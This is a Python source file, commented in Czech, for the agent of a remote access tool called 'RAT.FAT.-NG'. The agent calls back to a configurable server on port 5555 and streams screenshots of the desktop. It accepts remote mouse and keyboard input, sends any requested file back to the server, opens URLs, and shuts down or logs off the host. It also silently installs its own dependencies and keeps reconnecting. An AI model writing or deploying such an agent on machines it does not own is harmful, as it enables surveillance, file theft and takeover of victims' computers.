#!/usr/bin/env python3
# RAT.FAT.-NG agent (robustni)
import base64, io, json, os, socket, struct, subprocess, sys, threading, time, traceback

PORT     = 5555
FPS      = 10
QUALITY  = 50
MAX_W    = 1280
RETRY    = 3

LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent_log.txt")

def log(*a):
    line = time.strftime("[%H:%M:%S] ") + " ".join(str(x) for x in a)
    print(line, flush=True)
    try:
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass

# ---------------- zavislosti ----------------
def ensure(mod, pkg=None):
    try:
        return __import__(mod)
    except Exception:
        pass
    log("CHYBI", mod, "- zkousim doinstalovat", pkg or mod)
    for args in ([sys.executable, "-m", "pip", "install", "--quiet", pkg or mod],
                 [sys.executable, "-m", "pip", "install", "--quiet", "--user", pkg or mod]):
        try:
            subprocess.check_call(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return __import__(mod)
        except Exception as e:
            log("instalace selhala:", e)
    return None

Image = None
ImageGrab = None
mss_mod = None
pyautogui = None

def load_deps():
    global Image, ImageGrab, mss_mod, pyautogui
    if ensure("PIL", "pillow"):
        try:
            from PIL import Image as _I, ImageGrab as _G
            Image, ImageGrab = _I, _G
            log("PIL OK")
        except Exception as e:
            log("PIL import chyba:", e)
    mss_mod = ensure("mss")
    log("mss:", "OK" if mss_mod else "NE")
    if sys.platform != "win32":
        pyautogui = ensure("pyautogui")
        log("pyautogui:", "OK" if pyautogui else "NE")

# ---------------- vstup (ctypes / pyautogui) ----------------
if sys.platform == "win32":
    import ctypes
    from ctypes import wintypes
    u32 = ctypes.windll.user32
    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(2)
    except Exception:
        try: u32.SetProcessDPIAware()
        except Exception: pass

    INPUT_KEYBOARD   = 1
    KEYEVENTF_UNICODE = 0x0004
    KEYEVENTF_KEYUP   = 0x0002

    class _KI(ctypes.Structure):
        _fields_ = [("wVk", wintypes.WORD), ("wScan", wintypes.WORD),
                    ("dwFlags", wintypes.DWORD), ("time", wintypes.DWORD),
                    ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]

    class _INPUT(ctypes.Structure):
        class _U(ctypes.Union):
            _fields_ = [("ki", _KI), ("pad", ctypes.c_byte * 32)]
        _anonymous_ = ("u",)
        _fields_ = [("type", wintypes.DWORD), ("u", _U)]

    VK = {"return": 0x0D, "backspace": 0x08, "tab": 0x09, "escape": 0x1B,
          "space": 0x20, "delete": 0x2E, "up": 0x26, "down": 0x28,
          "left": 0x25, "right": 0x27, "home": 0x24, "end": 0x23,
          "prior": 0x21, "next": 0x22}

    def move(x, y): u32.SetCursorPos(int(x), int(y))

    def mdown(b="left"):
        u32.mouse_event(0x0002 if b == "left" else 0x0008, 0, 0, 0, 0)

    def mup(b="left"):
        u32.mouse_event(0x0004 if b == "left" else 0x0010, 0, 0, 0, 0)

    def click(x, y, b="left"):
        move(x, y); time.sleep(0.01); mdown(b); time.sleep(0.01); mup(b)

    def scroll(a):
        u32.mouse_event(0x0800, 0, 0, int(a) * 120, 0)

    def key(k):
        vk = VK.get(k)
        if vk is None:
            return type_text(k)
        u32.keybd_event(vk, 0, 0, 0)
        u32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)

    def type_text(t):
        for ch in t:
            for flags in (KEYEVENTF_UNICODE, KEYEVENTF_UNICODE | KEYEVENTF_KEYUP):
                inp = _INPUT(type=INPUT_KEYBOARD)
                inp.ki.wScan = ord(ch)
                inp.ki.dwFlags = flags
                u32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(_INPUT))
                time.sleep(0.002)

else:
    def move(x, y): pyautogui.moveTo(x, y, _pause=False)
    def mdown(b="left"): pyautogui.mouseDown(button=b)
    def mup(b="left"): pyautogui.mouseUp(button=b)
    def click(x, y, b="left"): pyautogui.click(x, y, button=b)
    def scroll(a): pyautogui.scroll(int(a))
    def key(k): pyautogui.press(k)
    def type_text(t): pyautogui.write(t)

# ---------------- sitovy protokol ----------------
_sock = None
_running = True
_streaming = True
_lock = threading.Lock()

def send_msg(sock, obj):
    data = json.dumps(obj).encode()
    with _lock:
        sock.sendall(struct.pack("!I", len(data)) + data)

def _recvall(sock, n):
    buf = b""
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c:
            return None
        buf += c
    return buf

def recv_msg(sock):
    h = _recvall(sock, 4)
    if not h:
        return None
    (n,) = struct.unpack("!I", h)
    d = _recvall(sock, n)
    if d is None:
        return None
    return json.loads(d.decode())

def report(text):
    log(text)
    try:
        if _sock:
            send_msg(_sock, {"type": "chat", "text": text})
    except Exception:
        pass

def popup(text):
    def run():
        try:
            if sys.platform == "win32":
                import ctypes
                ctypes.windll.user32.MessageBoxW(0, str(text), "RAT.FAT.-NG", 0x40 | 0x40000)
            else:
                subprocess.Popen(["notify-send", "RAT.FAT.-NG", str(text)])
        except Exception as e:
            log("popup chyba:", e)
    threading.Thread(target=run, daemon=True).start()

# ---------------- snimani obrazovky ----------------
def grab():
    if mss_mod:
        with mss_mod.mss() as sct:
            mon = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
            shot = sct.grab(mon)
            return Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
    if ImageGrab:
        return ImageGrab.grab().convert("RGB")
    raise RuntimeError("zadny zachyt obrazovky (chybi mss i PIL)")

def screen_loop():
    global _streaming
    warned = False
    while _running:
        if not _streaming or _sock is None:
            time.sleep(0.05); continue
        t0 = time.time()
        try:
            img = grab()
            w, h = img.size
            if w > MAX_W:
                h = int(h * MAX_W / w); w = MAX_W
                img = img.resize((w, h))
            buf = io.BytesIO()
            img.save(buf, "JPEG", quality=QUALITY)
            send_msg(_sock, {"type": "frame", "w": w, "h": h,
                             "data": base64.b64encode(buf.getvalue()).decode()})
            warned = False
        except Exception as e:
            if not warned:
                report("snimani obrazu selhalo: %s" % e)
                warned = True
            time.sleep(0.5)
        dt = 1.0 / FPS - (time.time() - t0)
        if dt > 0:
            time.sleep(dt)

# ---------------- prikazy ----------------
def handle(m):
    global _streaming, QUALITY, FPS
    c = m.get("cmd")
    try:
        if   c == "move":   move(m["x"], m["y"])
        elif c == "mdown":  mdown(m.get("button", "left"))
        elif c == "mup":    mup(m.get("button", "left"))
        elif c == "click":  click(m["x"], m["y"], m.get("button", "left"))
        elif c == "scroll": scroll(m.get("amount", 0))
        elif c == "key":    key(m["k"])
        elif c == "type":   type_text(m["text"])
        elif c == "url":
            import webbrowser; webbrowser.open(m["url"])
            report("otevreno: " + m["url"])
        elif c == "chat":   popup(m.get("text", ""))
        elif c == "stream": _streaming = bool(m.get("on"))
        elif c == "quality": QUALITY = int(m.get("q", 50))
        elif c == "fps":    FPS = max(1, int(m.get("f", 10)))
        elif c == "file":
            p = m["path"]
            with open(p, "rb") as f:
                data = f.read()
            send_msg(_sock, {"type": "file", "name": os.path.basename(p),
                             "data": base64.b64encode(data).decode()})
            report("poslan soubor: " + p)
        elif c == "power":
            a = m["action"]
            if sys.platform == "win32":
                cmd = {"shutdown": "shutdown /s /t 2", "restart": "shutdown /r /t 2",
                       "logoff": "shutdown /l", "lock": "rundll32.exe user32.dll,LockWorkStation"}
            else:
                cmd = {"shutdown": "shutdown -h now", "restart": "shutdown -r now",
                       "logoff": "pkill -KILL -u $USER", "lock": "loginctl lock-session"}
            subprocess.Popen(cmd.get(a, ""), shell=True)
        elif c == "exit":
            os._exit(0)
    except Exception as e:
        report("chyba prikazu %s: %s" % (c, e))

# ---------------- main ----------------
def main():
    global _sock, _running
    load_deps()

    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = os.getenv("RAT_SERVER", "127.0.0.1")

    log("RAT.FAT.-NG agent start, cil:", target, "port", PORT)
    log("python:", sys.version.split()[0], "| platforma:", sys.platform)
    threading.Thread(target=screen_loop, daemon=True).start()

    while _running:
        try:
            s = socket.create_connection((target, PORT), timeout=8)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(None)
            _sock = s
            log("PRIPOJENO na", target)
            send_msg(s, {"type": "info", "host": socket.gethostname(),
                         "os": sys.platform,
                         "user": os.getenv("USERNAME") or os.getenv("USER")})
            while True:
                m = recv_msg(s)
                if m is None:
                    break
                handle(m)
            log("spojeni ukonceno serverem")
        except socket.timeout:
            log("timeout pripojeni")
        except ConnectionRefusedError:
            log("server neprijima na %s:%d" % (target, PORT))
        except Exception as e:
            log("spojeni chyba:", e)
        finally:
            _sock = None
        time.sleep(RETRY)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception:
        log("FATAL:\n" + traceback.format_exc())
        time.sleep(5)